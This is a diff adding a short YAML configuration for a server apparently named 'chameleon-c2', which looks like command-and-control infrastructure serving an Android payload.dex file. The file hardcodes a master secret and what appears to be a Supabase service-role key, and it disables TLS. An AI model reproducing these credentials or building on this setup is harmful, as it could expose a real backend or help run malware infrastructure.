@@ -1,0 +1,11 @@
+server:
+  listen_addr: ":8080"
+  db_path: "/opt/chameleon-c2/data/chameleon.db"
+  master_secret: "ch4m3l30n-m4st3r-s3cr3t-k3y-2026"
+  supabase_url: "https://adicrtqpyccthnmacgzu.supabase.co"
+  supabase_key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkaWNydHFweWNjdGhubWFjZ3p1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzE4Mjg1MiwiZXhwIjoyMDkyNzU4ODUyfQ.j0yn5FvKRYAzYPSNMcZOXqUeOPafSEp7qkHAMrBslp8"
+  offline_after_seconds: 120
+  payload_dex_path: "/opt/chameleon-c2/data/payload.dex"
+  use_tls: false
+  cert_file: ""
+  key_file: ""
